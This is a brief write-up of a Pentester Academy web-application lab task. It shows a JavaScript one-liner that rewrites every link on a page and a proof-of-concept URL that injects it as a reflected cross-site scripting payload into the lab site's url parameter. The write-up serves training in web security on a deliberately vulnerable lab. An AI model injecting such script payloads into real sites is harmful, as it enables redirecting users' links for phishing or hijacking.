## Task 2 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/2)</small>

Objectives:

1. Change all the Links on this page to "http://PentesterAcademy/topics"

Since all the redirect link are created with `a` tag by setting the actual link in `href` attribute. So here we would have to find all the `a` tag and then update the value of `href`

Using [Document.querySelectorAll()](), you can find all the elements of matching selector, and [forEach](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelectorAll#Accessing_the_matches) property of this function you can iterate all the elements.

```js
document.querySelectorAll("a").forEach((a) => (a.href = "http://PentesterAcademy/topics"));
```

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/2?url=%3Cscript%3Edocument.querySelectorAll%28%22a%22%29.forEach%28%28a%29%20%3D%3E%20%28a.href%20%3D%20%22http%3A%2F%2FPentesterAcademy%2Ftopics%22%29%29%3B%3C/script%3E)
